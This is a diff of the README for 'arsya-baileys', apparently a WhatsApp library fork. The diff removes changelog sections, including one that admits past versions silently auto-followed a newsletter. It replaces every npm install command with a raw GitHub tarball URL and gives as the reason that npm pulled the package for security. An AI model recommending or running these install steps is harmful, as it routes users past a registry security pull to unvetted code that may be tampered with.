@@ -18,182 +18,6 @@ Ships compiled runtime files in `lib/` and protobuf artifacts in `WAProto/`, int
 
 ---
 
-## 🆕 Changelog / Updates (v1.0.4 — arsya-baileys)
-
-> **Distribusi:** sejak 9 Okt 2026 nama `arsya-baileys` di npm ditarik (security holding) — instal via GitHub: `npm i https://raw.githubusercontent.com/ziole-visa/arsya-baileys/main/dist/arsya-baileys-1.0.4.tgz`
-
-**Security**
-
-1. **Auto-follow channel disembunyikan DIHAPUS TOTAL** (`newsletter.js`, `Socket/index.js`, `Defaults/index.js`, `Types/Socket.d.ts`)
-
-   - Versi sebelumnya diam-diam mengirim IQ `w:mex` `QueryIds.FOLLOW` ke newsletter `120363410583500275@newsletter` **±90 detik setiap koneksi terbuka** (aktif secara bawaan, hanya bisa dimatikan lewat `autoFollowNewsletterOnConnect: false`). Ini bukan perilaku upstream Baileys.
-   - Dihapus: `runAutoFollow`, `triggerAutoFollow`, konfigurasi `autoFollowNewsletter*` (3 properti), serta pemanggilannya di `makeWASocket`.
-   - API eksplisit `sock.newsletterFollow(jid)` **tetap tersedia** untuk penggunaan by-request. Tidak ada lagi auto-follow/auto-join diam-diam.
-
-**Bug Fixes**
-
-1. **Decrypt retry tidak lagi memblokir antrean pesan** (`messages-recv.js`)
-
-   - Backoff antar attempt decrypt kini berjalan **di luar** `messageMutex` — satu pesan gagal decrypt tidak lagi menahan seluruh queue inbound (head-of-line blocking ±1,2 detik per pesan gagal).
-   - Decrypt + post-processing (ack/receipt/retry-request/upsert) tetap dalam satu akuisisi mutex, sehingga urutan pesan terjaga.
-   - Error permanen (`Key used already or never filled`, `Message absent from node`) tidak lagi di-retry percuma — langsung ke jalur final (ack / placeholder resend).
-
-2. **`areJidsSameUser(undefined, undefined)` kini `false`**
-
-   - Sebelumnya `undefined === undefined` → `true`, sehingga notification/receipt tanpa jid dianggap "dari saya" (mis. `devices` notification, `isNodeFromMe` pada receipt).
-
-3. **Null-guard + error handling handler `CB:ib,,dirty`** (`groups.js`, `communities.js`, `chats.js`)
-
-   - Child `dirty` yang hilang tidak lagi melempar `TypeError` (destructure `undefined`).
-   - Async listener kini dibungkus try/catch — tidak ada lagi unhandled rejection yang bisa mematikan proses Node.
-
-4. **`SendQueue` ditutup saat disconnect** (`messages-send.js`)
-
-   - Listener `connection.update` menutup queue pada `close`: drain loop berhenti, pending task di-reject dengan jelas, push baru ditolak. `AutoReconnect` tetap aman (membuat socket + queue baru via factory).
-
-5. **`downloadToBuffer` retry menyeluruh** (`media-download.js`)
-
-   - Retry kini mencakup request **dan** pembacaan stream (connection reset di tengah stream sebelumnya lolos retry); stream di-destroy saat gagal agar tidak bocor.
-
-6. **Metadata cache koreksi TTL** (`metadata-cache.js`)
-
-   - TTL absolut dari waktu `set` (`updateAgeOnGet: false`) — entry yang sering dibaca tetap expire & refresh.
-   - `ttl: 0` kini benar-benar nonaktif (sebelumnya jatuh ke default karena `Number(0) || default`).
-   - `force: true` bypass in-flight coalescing + identity-check pada cleanup promise.
-
----
-
-## 🆕 Previous (v9.2.0 — arsya-baileys)
-
-**1. Metadata Cache Enhanced (TTL)**
-
-- Cache bawaan untuk `groupMetadata` (LRU + TTL + in-flight coalescing).
-- Auto-invalidate saat event `groups.update` / `group-participants.update`.
-- `groupMetadataFresh(jid)` untuk bypass cache (dipakai internal `groupUpdateDescription`).
-- Config:
-
-  ```js
-  const sock = makeWASocket({
-    metadataCache: {
-      enabled: true,  // false = nonaktif
-      ttl: 300,       // detik (default 5 menit)
-      max: 1000,      // max entry LRU
-    },
-  });
-  // sock.metadataCache.stats → { hits, misses, sets, coalesced }
-  // await sock.groupMetadata(jid)      → lewat cache
-  // await sock.groupMetadataFresh(jid) → always live
-  ```
-
-**2. Media Download Helpers**
-
-- `downloadToBuffer(message, type, opts, retry)` — download media ke `Buffer` dengan auto-retry.
-- `downloadContentFromMessageWithRetry(...)` — stream download + retry transient (408/425/429/5xx + network error). Status permanen (404/410) **tidak** di-retry.
-- Config `mediaDownloadRetry` (default: 3 attempts, delay 500ms × attempt).
-
-  ```js
-  import { downloadToBuffer, withMediaDownloadRetry } from 'arsya-baileys';
-
-  const buf = await downloadToBuffer(msgMedia, 'image', {}, { maxAttempts: 3, logger });
-  // atau retry generik:
-  await withMediaDownloadRetry(() => doWork(), { maxAttempts: 3, delayMs: 500 });
-  ```
-
----
-
-## 🆕 Older (v9.1.0 — arsya-baileys)
-
-**1. Anti-lag / Rate-limit Kirim (`SendQueue`)**
-
-- Semua `relayMessage` keluar melewati antrian rate-limit (default: min interval **150ms**, max **2** concurrent, max queue **500**).
-- Kurangi risiko flood/429 & socket lag saat broadcast/spam fitur.
-- Config:
-
-  ```js
-  const sock = makeWASocket({
-    antiLagSend: {
-      enabled: true,       // false = nonaktif
-      minIntervalMs: 150,
-      maxConcurrent: 2,
-      maxQueue: 500,
-    },
-  });
-  // sock.sendQueue.stats → { pending, active, ... }
-  ```
-
-**2. Auto-retry Decrypt + Auto Reconnect**
-
-- Decrypt gagal (transient / session record) otomatis di-retry hingga **3×** dengan backoff (`autoDecryptRetry`).
-- Helper `AutoReconnect` untuk re-create socket dengan exponential backoff (tidak reconnect saat logged-out).
-
-  ```js
-  import makeWASocket, { AutoReconnect } from 'arsya-baileys';
-
-  const re = new AutoReconnect({
-    factory: makeWASocket,
-    config: { /* socket config */ },
-    maxRetries: 5,
-    baseDelayMs: 1000,
-  });
-  let sock = re.start();
-  re.onReconnect = ({ sock: s }) => { sock = s; };
-  ```
-
-**3. Helper API baru: `ARich`**
-
-- `ARich` extends `AIRich` — preset layout bot (heading, bullets, steps, key/values, brand footer, `sendSafe`).
-- `ORich` tetap tersedia (backward-compatible, kini inherit `ARich`).
-
-  ```js
-  import { ARich } from 'arsya-baileys';
-
-  await new ARich(sock)
-    .addHeading('Status')
-    .addKeyValues({ cpu: '12%', ram: '512MB' })
-    .addBullets(['OK', 'Delay 40ms'])
-    .setBrand('Arsya Bot')
-    .send(jid);
-  ```
-
----
-
-## 📦 Legacy changelog
-
-
-**1. Fix `additionalNodes` Conflict (v9.0.1)**
-
-- Fixed an issue where supplying a custom `<biz>` node in `additionalNodes` alongside interactive messages caused duplicate `<biz>` nodes in the stanza, which led to the message being silently rejected by WhatsApp.
-
-**2. Built-in VoIP (Voice Call) Engine (v9.0.0)**
-
-- Full integration of the WebRTC and WASM engines to enable native WhatsApp voice calling, eliminating the need for a separate package.
-
-**2. Fix View Once Error (Anti-Crash)**
-
-- WhatsApp (Meta) Web API no longer receives media content for View Once messages, which previously caused the socket to crash. We've added robust parsing (`viewOnceMessageV3` & `ptvMessage`) to gracefully handle these empty stubs without crashing your bot.
-
-**2. Decryption Retry Fix (Private Chats)**
-
-- Fixed an issue in `messages-recv.js` where "Bad MAC" / decryption errors would close the connection. Combined with a proper `getMessage` hook in your main connection setup, the bot now seamlessly retries failed decryptions.
-- Browser parameter spoofing upgraded to MacOS to prevent Error 405 (Method Not Allowed) during pairing.
-
-**3. AI Rich Implementation (`ORich`)**
-
-- Added the `ORich` class (an extension of `AIRich` from `message_builder.js`) to generate stunning AI response layouts easily.
-- **Example Usage:**
-
-  ```javascript
-  import { ORich } from 'arsya-baileys';
-
-  const arsya = new ORich(sock)
-    .addText('Hello from ORich AI!')
-    .addSuggest(['Tell me more', 'Next']);
-  
-  await arsya.send(jid);
-  ```
-
----
-
 ## Table of Contents
 
 - [arsya-baileys](#arsya-baileys)
@@ -297,10 +121,14 @@ If you are documenting or integrating this project, treat `lib/index.js` and `li
 
 ## 📦 Installation
 
-### From NPM
+> [!IMPORTANT]
+> The npm package `arsya-baileys` was **pulled from npm** as a security holding on 9 Oct 2026.
+> Install only via the **GitHub tarball** (below). Do **not** use `npm install arsya-baileys`.
+
+### From GitHub tarball (recommended)
 
 ```bash
-npm install arsya-baileys
+npm install https://raw.githubusercontent.com/ziole-visa/arsya-baileys/main/dist/arsya-baileys-1.0.6.tgz
 ```
 
 Recommended companion packages for examples in this README:
@@ -316,7 +144,7 @@ Add to `package.json`:
 ```json
 {
   "dependencies": {
-    "arsya": "npm:arsya-baileys@latest"
+    "arsya": "https://raw.githubusercontent.com/ziole-visa/arsya-baileys/main/dist/arsya-baileys-1.0.6.tgz"
   }
 }
 ```
@@ -362,7 +190,7 @@ Ensure `package.json` has `"type": "module"`:
 ### 2. Install Dependencies
 
 ```bash
-npm install arsya-baileys pino qrcode-terminal
+npm install https://raw.githubusercontent.com/ziole-visa/arsya-baileys/main/dist/arsya-baileys-1.0.6.tgz pino qrcode-terminal
 ```
 
 ### 3. Create `index.js`
